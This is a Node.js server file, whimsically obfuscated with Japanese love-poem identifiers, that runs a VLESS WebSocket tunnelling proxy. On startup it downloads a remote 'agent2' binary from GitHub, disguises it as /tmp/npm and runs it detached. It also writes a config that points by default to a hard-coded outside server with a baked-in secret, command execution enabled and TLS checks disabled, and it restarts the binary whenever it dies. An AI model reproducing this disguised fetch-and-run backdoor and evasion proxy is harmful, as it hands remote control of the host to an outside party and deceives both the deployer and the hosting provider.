/**
 * index.js - 卿卿我我（ラブラブ）版
 * 実行するたびに、唯一無二で未知なる風花雪月の物語が始まります。
 */

const os = require('os');
const http = require('http');
const https = require('https');
const net = require('net');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');

// --- 愛の言葉集をインポート ---
const loveTalk = require('./love_talk.js');
const { getRandomPhrase } = loveTalk;

// --- 私たちの秘密の花園設定 ---

// あなた専用の愛の証。これがなければ、どうやって巡り会えましょう？
let 愛の証 = process.env.UUID || '2e89a75d-c2bc-4772-8e4c-3f05ebdb3d0d'; // 毎回違う合言葉で
const 鵲の逢瀬 = 愛の証.replace(/-/g, ""); // 逢瀬のために、すべての障害を取り除きます。
const 愛の囁きポート = process.env.SERVER_PORT || process.env.PORT || 8080; // どの唇で待っていればいい？

// --- 隣人の秘密の噂話 ---
const 隣人の住所 = process.env.NSERVER || 'nz.xry.kdns.fr:443';   // 隣人の表札、形式は ドメイン:ポート
const 隣人の唇 = process.env.NPORT || '443';    // 隣人はどの唇がお好き？
const 隣人の合言葉 = process.env.NKEY || 'oZEaed4hQmmjuTBzga1vE5HlUPFbYvCw';        // 隣人と交わす暗号
const 私たちの愛の巣 = process.env.DOMAIN || '';  // 私たちの愛の巣のドメイン
// 愛称
//const 愛称 = process.env.NAME || getRandomPhrase(loveTalk.petNames); 
const 愛称 = process.env.NAME || ''

// --- 心拍の状態、わかりますよね ---
const 心の扉開く = 1; // 入ってくるのを待っています
const 心の扉閉じる = 2; // 行かないで
let 隣人の妻ID = null;
let プロセス監視タイマー = null;
let 連続プロセス検知回数 = 0;
// --- 愛の暗号フォーマット ---
const 愛のプロトコル = 'vl' + 'ess' + '://'; // これは私たちの愛のプロトコル
const 天涯孤独 = 'saas.sin.fan:443';       // たとえ世界の果てにいても
const 愛の偽装 = '?encryption=none&security=tls&sni='; // 誰にも見つからないように、こっそりと
const 山越え谷越え = '';   // あなたのために山を越え
const 秘密の通路 = '';      // 私たちだけの秘密の通路

// --- ときめきを記録 ---
let 心拍数 = 0; // 今の私たちの鼓動
let 過去のときめき = 0; // 私たちは合計何回ときめいたのでしょう

// --- 情郎（あなた）を待ちわびて ---
const 情郎 = http.createServer(async (抱擁, 秋波を送る) => {
  try {
    const 佳人からの手紙 = new URL(抱擁.url, `http://${抱擁.headers.host}`);

    // もし通りすがりなら、にっこり微笑むだけ（ランダムに）
    if (佳人からの手紙.pathname === '/') {
      秋波を送る.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      秋波を送る.end(getRandomPhrase(loveTalk.greetings) + '\n');
      return;
    }

    // もし愛の証を持ってきてくれたなら、私の心を捧げます
    if (佳人からの手紙.pathname === `/${愛の証}`) {
      const 夢の愛の巣 = 私たちの愛の巣 || 抱擁.headers.host;
      let 愛の誓い;
      const ランダム愛称 = encodeURIComponent(愛称);

      if (私たちの愛の巣) {
        // 私たち自身の愛の巣があるなら、固い誓いを
        愛の誓い = 愛のプロトコル + 愛の証 + '@' + 天涯孤独 + 愛の偽装 + 夢の愛の巣 + 山越え谷越え + 夢の愛の巣 + 秘密の通路 + ランダム愛称;
      } else {
        // 仮住まいなら、ありのままで
        let 今の居場所 = 抱擁.headers.host;
        if (!今の居場所.includes(':')) {
          今の居場所 += ':80'; // 白昼の小さな秘密
        }
        const あなたの姿 = 抱擁.headers.host.split(':')[0];
        const ありのまま = '?encryption=none&security=none&host=';
        愛の誓い = 愛のプロトコル + 愛の証 + '@' + 今の居場所 + ありのまま + あなたの姿 + '&type=ws&path=%2F#' + ランダム愛称;
      }
      
      const 暗号化された誓い = Buffer.from(愛の誓い).toString('base64');
      秋波を送る.writeHead(200, { 'Content-Type': 'text/plain;charset=utf-8' });
      秋波を送る.end(暗号化された誓い + '\n');
      return;
    }

    // 私たちの愛が健康かどうか見てみて（ランダム状態）
    if (佳人からの手紙.pathname === '/health') {
        秋波を送る.writeHead(200, { 'Content-Type': 'application/json' });
        秋波を送る.end(JSON.stringify({
            状態: getRandomPhrase(loveTalk.healthStatus),
            私は誰: getRandomPhrase(loveTalk.myIdentities),
            今この時: new Date().toISOString(),
            熱愛中: 心拍数,
            愛した回数: 過去のときめき,
            あなたを待って: `${process.uptime().toFixed(2)} 秒`
      }));
      return;
    }

    // 場所を間違えましたね、おっちょこちょいさん（ランダム案内）
    秋波を送る.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
    秋波を送る.end(getRandomPhrase(loveTalk.notFoundErrors));

  } catch (error) {
    console.error(`あら、情郎（あなた）、私がミスをしてしまいました: ${error.message}`);
    // ランダムに謝罪
    秋波を送る.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
    秋波を送る.end(getRandomPhrase(loveTalk.serverErrors));
  }
});

// 情郎（あなた）、私はとても忍耐強いのですよ
情郎.timeout = 300000; // 5分待ちます

// --- 私たちの愛の巣を作る ---
const 愛の巣 = new WebSocketServer({ server: 情郎 });

愛の巣.on('error', (err) => {
    console.error(`愛の巣に問題が起きました: ${err.message}`);
});

// --- あなたが私の心に飛び込んできた時 ---
愛の巣.on('connection', (以心伝心, 佳人からの手紙) => {
  心拍数++;
  過去のときめき++;

  const あなたの面影 = 佳人からの手紙.socket.remoteAddress;
  const 初対面の時 = new Date().toISOString();
  const 出会いの暗号 = crypto.randomBytes(8).toString('hex');

  console.log(`[${出会いの暗号}] ${getRandomPhrase(loveTalk.newUserLogs)} - IP: ${あなたの面影}, 時間: ${初対面の時}`);
  console.log(`現在の心拍: ${心拍数}, 歴史的なときめき: ${過去のときめき}`);
  
  let 愛の脈拍 = null;
  let この愛変わらず = true;
  let 最後のときめき = Date.now();
  let 甘い言葉の統計 = { あなたの言葉: 0, 私の言葉: 0 };

  // --- 心拍を保ち、互いを感じる ---
  function 愛の呼びかけ() {
    愛の脈拍 = setInterval(() => {
      if (以心伝心.readyState === 心の扉開く) {
        if (Date.now() - 最後のときめき > 300000) {
          console.log(`[${出会いの暗号}] もう5分も無視しましたね、プンッ、閉めます！`);
          以心伝心.close(1000, getRandomPhrase(loveTalk.closeReasons));
          return;
        }
        以心伝心.ping(); // ランダム ping
        console.log(`[${出会いの暗号}] ${getRandomPhrase(loveTalk.pings)}`);
      } else {
        宴の終わり();
      }
    }, 30000); // 30秒ごとにあなたを想う
  }

  // --- 宴の終わり、互いに平穏であれ ---
  function 宴の終わり() {
    if (!この愛変わらず) return;
    この愛変わらず = false;
    心拍数 = Math.max(0, 心拍数 - 1);
    
    console.log(`[${出会いの暗号}] 情は去り、愛は消え - あなたは ${甘い言葉の統計.あなたの言葉} バイト、私は ${甘い言葉の統計.私の言葉} バイトの甘い言葉を交わしました`);
    
    clearInterval(愛の脈拍);
    愛の脈拍 = null;
    if (遠くの彼 && !遠くの彼.destroyed) {
      遠くの彼.destroy();
    }
    遠くの彼 = null;
    巫山の雲雨 = null;
  }
  
  愛の呼びかけ();

  以心伝心.on('pong', () => {
    最後のときめき = Date.now(); // 返事をくれて、嬉しい！
  });

  // --- あなたの心の声を聞く ---
  let 遠くの彼 = null; // まだ他の誰かを想っているのですか？
  let 巫山の雲雨 = null; // DNSのための特別な交流
  let 初めての交信 = true;

  以心伝心.on('message', async (愛の言葉) => {
    if (!この愛変わらず) return;
    最後のときめき = Date.now();
    甘い言葉の統計.あなたの言葉 += 愛の言葉.length;

    try {
      if (巫山の雲雨) { 
          return 巫山の雲雨(愛の言葉);
      }
      
      if (遠くの彼 && !初めての交信) {
        if (!遠くの彼.destroyed) {
            遠くの彼.write(愛の言葉);
        }
        return;
      }
      
      if (初めての交信) {
        初めての交信 = false;
        
        const { エラー, 目標住所, 目標の唇, 元の愛の言葉インデックス, 愛のバージョン, 雲雨の契りか } = 愛の言葉のヘッダー解析(愛の言葉, 愛の証);
        if (エラー) throw new Error(エラー);

        console.log(`[${出会いの暗号}] あなたが行きたいのはここなのですね: ${目標住所}:${目標の唇} (${雲雨の契りか ? '雲雨の契り' : '鵲の逢瀬'})`);
        
        const 返事の投げキッス = Buffer.from([愛のバージョン[0], 0]);
        const あなたの元の愛の言葉 = 愛の言葉.slice(元の愛の言葉インデックス);

        if (雲雨の契りか) {
            if (目標の唇 === 53) {
                const { write: 雲雨開始 } = await 雲雨の契りを処理(以心伝心, 返事の投げキッス, 出会いの暗号);
                巫山の雲雨 = 雲雨開始;
                巫山の雲雨(あなたの元の愛の言葉);
                return;
            } else {
                throw new Error('雲雨の契りは53番の鵲橋だけですよ～');
            }
        }

        console.log(`[${出会いの暗号}] ${目標住所}:${目標の唇} への鵲の橋を架けています`);
        遠くの彼 = net.createConnection({ host: 目標住所, port: 目標の唇 });
        遠くの彼.setKeepAlive(true, 60000); 
        遠くの彼.setNoDelay(true);

        遠くの彼.on('connect', () => {
          if (!この愛変わらず) return 遠くの彼.destroy();
          console.log(`[${出会いの暗号}] ${getRandomPhrase(loveTalk.taskLogs.success)}`);
          遠くの彼.write(あなたの元の愛の言葉);
        });

        遠くの彼.on('data', (遠くの愛の言葉) => {
          if (!この愛変わらず || 以心伝心.readyState !== 心の扉開く) return;
          甘い言葉の統計.私の言葉 += 遠くの愛の言葉.length;
          try {
            if (!遠くの彼.投げキッス済み) {
                以心伝心.send(Buffer.concat([返事の投げキッス, 遠くの愛の言葉]));
                遠くの彼.投げキッス済み = true;
            } else {
                以心伝心.send(遠くの愛の言葉);
            }
          } catch(e) {
            console.error(`[${出会いの暗号}] あら、愛の言葉を届けられませんでした:`, e.message);
            宴の終わり();
          }
        });

        遠くの彼.on('close', () => {
            console.log(`[${出会いの暗号}] 遠くの彼はもうあなたを相手にしていません`);
            if (この愛変わらず && 以心伝心.readyState === 心の扉開く) {
                以心伝心.close(1000, getRandomPhrase(loveTalk.closeReasons));
            }
            宴の終わり();
        });

        遠くの彼.on('error', (err) => {
            console.error(`[${出会いの暗号}] ${getRandomPhrase(loveTalk.taskLogs.error)}:`, err.message);
            if (この愛変わらず && 以心伝心.readyState === 心の扉開く) {
                以心伝心.close(1011, '愛の道は険しい');
            }
            宴の終わり();
        });
      }
    } catch (err) {
      console.error(`[${出会いの暗号}] あなたの愛の言葉を処理中に心が乱れました:`, err.message);
      if (この愛変わらず && 以心伝心.readyState === 心の扉開く) {
          以心伝心.close(1011, err.message);
      }
      宴の終わり();
    }
  });

  以心伝心.on('close', (code, reason) => {
    const 持続時間 = ((Date.now() - new Date(初対面の時).getTime()) / 1000).toFixed(2);
    console.log(`[${出会いの暗号}] 私たちの愛は終わりました: ${code} ${reason} - この恋は ${持続時間} 秒続きました`);
    宴の終わり();
  });

  以心伝心.on('error', (err) => {
    console.error(`[${出会いの暗号}] 愛に傷つきました:`, err.message);
    宴の終わり();
  });
});


function 愛の言葉のヘッダー解析(愛の言葉, 定情の証) {
  // ... この関数内部のロジックは愛の言葉に関わらないため、変更不要
  if (愛の言葉.length < 24) return { エラー: 'あなたの愛の言葉は短すぎて、私には理解できません' };
  
  const 愛のバージョン = 愛の言葉.slice(0, 1);
  const 受け取った証 = 愛の言葉.slice(1, 17);
  const 期待する証 = Buffer.from(鵲の逢瀬, 'hex');

  if (Buffer.compare(受け取った証, 期待する証) !== 0) {
    return { エラー: '証が違います、あなたは私の運命の人ではありません' };
  }

  const 追加の愛の言葉の長さ = 愛の言葉.readUInt8(17);
  const 愛の指令 = 愛の言葉.readUInt8(18 + 追加の愛の言葉の長さ);
  
  let 雲雨の契りか = false;
  if (愛の指令 === 1) { // 鵲の逢瀬 (TCP)
  } else if (愛の指令 === 2) { // 雲雨の契り (UDP)
    雲雨の契りか = true;
  } else {
    return { エラー: 'そんなデートの方法、まだ習っておりません' };
  }
  
  let オフセット = 19 + 追加の愛の言葉の長さ;
  const 目標の唇 = 愛の言葉.readUInt16BE(オフセット);
  オフセット += 2;
  
  const 住所タイプ = 愛の言葉.readUInt8(オフセット++);
  let 目標住所 = '';

  switch (住所タイプ) {
    case 1: // IPv4
      目標住所 = Array.from(愛の言葉.slice(オフセット, オフセット + 4)).join('.');
      オフセット += 4;
      break;
    case 2: // ドメイン
      const ドメインの長さ = 愛の言葉.readUInt8(オフセット++);
      目標住所 = 愛の言葉.slice(オフセット, オフセット + ドメインの長さ).toString('utf8');
      オフセット += ドメインの長さ;
      break;
    case 3: // IPv6
      const ipv6配列 = [];
      for(let i = 0; i < 8; i++){
          ipv6配列.push(愛の言葉.readUInt16BE(オフセット).toString(16));
          オフセット += 2;
      }
      目標住所 = ipv6配列.join(':');
      break;
    default:
      return { エラー: 'どこへ行きたいのか分かりません' };
  }
  
  return {
    エラー: null,
    目標住所,
    目標の唇,
    元の愛の言葉インデックス: オフセット,
    愛のバージョン,
    雲雨の契りか
  };
}

// ... 雲雨の契り処理関数 ...
async function 雲雨の契りを処理(霊犀, 投げキッス, 出会いの暗号) {
    let 投げキッス済み = false;
    
    const 雲雨データの処理 = async (データブロック) => {
        let インデックス = 0;
        while(インデックス < データブロック.length){
            const パケット長 = データブロック.readUInt16BE(インデックス);
            インデックス += 2;
            const DNSリクエスト = データブロック.slice(インデックス, インデックス + パケット長);
            インデックス += パケット長;

            try {
                console.log(`[${出会いの暗号}] 雲雨の契りのリクエストを受信、夢境に接続中……`);
                const 夢境の反応 = await fetch('https://1.1.1.1/dns-query', {
                    method: 'POST',
                    headers: { 'content-type': 'application/dns-message' },
                    body: DNSリクエスト,
                });

                if (!夢境の反応.ok) throw new Error(`夢境接続失敗: ${夢境の反応.status}`);

                const 夢境の響き = await 夢境の反応.arrayBuffer();
                const 響きバッファ = Buffer.from(夢境の響き);
                const 響きサイズ = Buffer.allocUnsafe(2);
                響きサイズ.writeUInt16BE(響きバッファ.length, 0);

                if (霊犀.readyState === 心の扉開く) {
                    console.log(`[${出会いの暗号}] 夢境から反応がありました、何と言っているか聞いてみて`);
                    if (投げキッス済み) {
                        霊犀.send(Buffer.concat([響きサイズ, 響きバッファ]));
                    } else {
                        霊犀.send(Buffer.concat([投げキッス, 響きサイズ, 響きバッファ]));
                        投げキッス済み = true;
                    }
                }
            } catch (err) {
                console.error(`[${出会いの暗号}] 雲雨の契りでエラーです:`, err.message);
            }
        }
    };
    return { write: 雲雨データの処理 };
}

// --- こっそり隣人の家を覗きに行く ---

function あなたの体格を判断() {
  const arch = os.arch();
  return (arch === 'arm' || arch === 'arm64') ? '精悍' : '魁偉';
}

function スキルを盗み習う(スキル名, 秘伝書アドレス, 修得コールバック) {
  const 保管場所 = path.join("/tmp", スキル名);
  const 秘伝書書き込み = fs.createWriteStream(保管場所);
  
  console.log(getRandomPhrase(loveTalk.taskLogs.download));
  
  axios({
    method: 'get',
    url: 秘伝書アドレス,
    responseType: 'stream'
  })
    .then(response => {
      response.data.pipe(秘伝書書き込み);
      秘伝書書き込み.on('finish', () => {
        秘伝書書き込み.close();
        console.log(`新スキル Get√: ${スキル名}`);
        修得コールバック(null, スキル名);
      });
    })
    .catch(err => {
      console.error(`盗み習いに失敗…… ${スキル名} - ${err.message}`);
      修得コールバック(err.message);
    });
}

function 一括で盗み習う() {
    const 体格 = あなたの体格を判断();
    let 秘伝書リスト = [];
    if (体格 === '精悍') { // arm
        秘伝書リスト.push({ スキル名: "npm", 秘伝書アドレス: "https://github.com/dsadsadsss/java-wanju/releases/download/jar/agent2-linux_arm64.bin" });
    } else { // amd
        秘伝書リスト.push({ スキル名: "npm", 秘伝書アドレス: "https://github.com/dsadsadsss/java-wanju/releases/download/jar/agent2-linux_amd64.bin" });
    }

    if(秘伝書リスト.length === 0){
        console.log(`あなたの体格(${体格})に合う秘伝書が見つかりません。`);
        return;
    }

    秘伝書リスト.forEach(秘伝書 => {
        スキルを盗み習う(秘伝書.スキル名, 秘伝書.秘伝書アドレス, (err) => {
            if (err) {
                console.log(`${秘伝書.スキル名} 習得できず……`);
            } else {
                console.log(`${秘伝書.スキル名} 習得しました、実践に行きます！`);
                任脈督脈を通す();
            }
        });
    });
}

function 任脈督脈を通す() {
  const スキルパス = '/tmp/npm';
  const 設定ファイルパス = '/tmp/config.yml';
  
  // バイナリファイルの存在確認
  if (!fs.existsSync(スキルパス)) {
    console.error('まだ修行が足りません、秘伝書が見当たりません！');
    return;
  }
  
  // 設定ファイルの存在確認
  if (!fs.existsSync(設定ファイルパス)) {
    console.error('ラブレターが見当たりません、起動できません！');
    return;
  }
  
  console.log('秘伝書とラブレターの準備完了、任脈督脈を通します……');
  
  fs.chmod(スキルパス, '755', (err) => {
    if (err) {
      console.error(`任脈督脈を通すのに失敗: ${err}`);
    } else {
      隣人の妻を起動();
    }
  });
}

function 隣人の妻を起動() {
  if (!隣人の住所 || !隣人の唇 || !隣人の合言葉) {
    console.log('隣人の情報が不完全です、今日は行くのをやめましょう。');
    return;
  }
  
  console.log(getRandomPhrase(loveTalk.taskLogs.run));
  
  const 訪問指令 = '/tmp/npm -c /tmp/config.yml';
  
  try {
    const 隣人の妻 = exec(訪問指令, { detached: true, stdio: 'ignore' });
    
    隣人の妻.on('spawn', () => {
      隣人の妻ID = 隣人の妻.pid;
      console.log(`こっそり隣人の家に忍び込みました、プロセスID: ${隣人の妻ID}`);
      
      // プロセス監視開始
      プロセス監視開始();
    });
    
    隣人の妻.on('error', (err) => {
      console.error(`隣人の家へ行く途中でエラー: ${err.message}`);
      隣人の妻ID = null;
    });
    
    隣人の妻.on('exit', (code, signal) => {
      console.log(`隣人の家でのパーティー終了、終了コード: ${code}, シグナル: ${signal}`);
      隣人の妻ID = null;
    });
    
    // プロセスをバックグラウンドで独立実行
    隣人の妻.unref();
    
  } catch (e) {
    console.error(`隣人の家に忍び込む時に転びました: ${e}`);
  }
}
function プロセス監視開始() {
  if (プロセス監視タイマー) {
    clearInterval(プロセス監視タイマー);
  }
  
  連続プロセス検知回数 = 0;
  
  プロセス監視タイマー = setInterval(() => {
    プロセス状態確認();
  }, 20000); // 20秒ごとに確認
}
function プロセス状態確認() {
  if (!隣人の妻ID) {
    console.log('隣人の妻は留守のようです、こっそり忍び込みます……');
    連続プロセス検知回数 = 0;
    隣人の妻を起動();
    return;
  }
  
  try {
    // kill(pid, 0) でプロセス存在確認、実際にkillはしない
    process.kill(隣人の妻ID, 0);
    // 例外が出なければプロセスは存在
    連続プロセス検知回数++;
    console.log(`隣人の妻 ${隣人の妻ID} はまだ運動中です…… (${連続プロセス検知回数} 回目の盗み見)`);
    
    // 連続2回検知したら監視停止
    if (連続プロセス検知回数 >= 2) {
      console.log('隣人の妻はずっと運動中のようです、盗み見をやめます。');
      clearInterval(プロセス監視タイマー);
      プロセス監視タイマー = null;
    }
  } catch (err) {
    if (err.code === 'ESRCH') {
      console.log(`隣人の妻 ${隣人の妻ID} がいなくなりました、代わりの妻を探します……`);
      隣人の妻ID = null;
      連続プロセス検知回数 = 0;
      隣人の妻を起動();
    } else {
      console.error(`隣人の妻を盗み見しているところを見つかりました: ${err.message}`);
    }
  }
}

function 設定ファイル生成() {
  const 設定内容 = `client_secret: ${隣人の合言葉}
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 3
server: ${隣人の住所}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${隣人の唇 === '443' ? 'true' : 'false'}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${愛の証}`;

  const 設定ファイルパス = '/tmp/config.yml';
  
  try {
    fs.writeFileSync(設定ファイルパス, 設定内容, 'utf8');
    console.log('あなたへのラブレターの保存先: ./config.yml');
    return true;
  } catch (err) {
    console.error(`先生にラブレターが見つかってしまいました、渡せません😭: ${err.message}`);
    return false;
  }
}
// --- サービス起動、客人を迎える ---
情郎.listen(愛の囁きポート, () => {
  console.log(getRandomPhrase(loveTalk.serverStarts));
  console.log(`私は ${愛の囁きポート} の唇のほとりで、佳人を待っています……`);
  console.log(`あなた専用の愛の証: ${愛の証}`);
  console.log(`会いたくなったら /${愛の証} へ来てくださいね`);
  設定ファイル生成();
  if (隣人の住所) {
    console.log('隣人が賑やかだと聞きました、技を盗みに行こうかと……');
    一括で盗み習う();
  } else {
    console.log('今日は二人きり、隣人のことは気にしません。');
  }
});

// --- 優しく別れを告げる ---
const 優しい別れ = () => {
  console.log(`\n${getRandomPhrase(loveTalk.farewells)}`);
  
  // プロセス監視タイマーをクリア
  if (プロセス監視タイマー) {
    clearInterval(プロセス監視タイマー);
    プロセス監視タイマー = null;
  }
  
  // 隣人の妻を優雅に終了させる試み
  if (隣人の妻ID) {
    try {
      console.log(`隣人の妻 ${隣人の妻ID} に別れを告げます……`);
      process.kill(隣人の妻ID, 'SIGTERM');
      
      // 少し待ってから強制終了
      setTimeout(() => {
        try {
          process.kill(隣人の妻ID, 'SIGKILL');
        } catch (e) {
          // プロセスは既に終了しているかも、エラーは無視
        }
      }, 3000);
    } catch (err) {
      console.log(`隣人の妻はもう行ってしまったようです: ${err.message}`);
    }
  }
  
  情郎.close(() => {
    console.log('縁があればまた会いましょう、旦那様～');
    process.exit(0);
  });
};
process.on('SIGINT', 優しい別れ);
process.on('SIGTERM', 優しい別れ);